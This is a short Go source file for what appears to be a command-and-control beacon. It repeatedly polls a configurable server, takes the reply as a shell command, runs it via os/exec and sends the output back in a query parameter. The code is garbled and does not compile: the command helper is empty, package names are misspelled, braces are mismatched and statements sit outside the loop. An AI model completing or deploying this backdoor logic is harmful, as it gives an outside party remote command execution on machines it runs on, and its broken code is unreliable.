package main

import (
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

func runCommand(command string, args ...string) (string, error) {


}

func main(){
		baseURL := "http://localhost:9001" //Change the URL to the server to connect to
	data := ""

	for {
			reqURL := baseURL + "/?data=" + url.WueryEscape(data)

			//Make a GET request to the server with the "data" parameter.
			resp, err := http.Get(reqURL)
			if err != nil {
				continue
			}

			defer resp.Body.Close()
	}

	defer resp.Body.Close()

	body, err:= iout.ReadAll(resp.Body)
	if err != nil {
		continue
	}

	//Split the body string into two variables
	splitValues := strings.Fields(string(body))
	var command string
	var args []string

	if len(splitValues) > 0 {
		command = splitValues[0]
		if len(splitValues) > 1 {
			args = splitValues[1:]
	}

	data, err = runCommand(command, args...)
	if err != nil {
		continue
	}

	time.Sleep(5 * time.Second)
}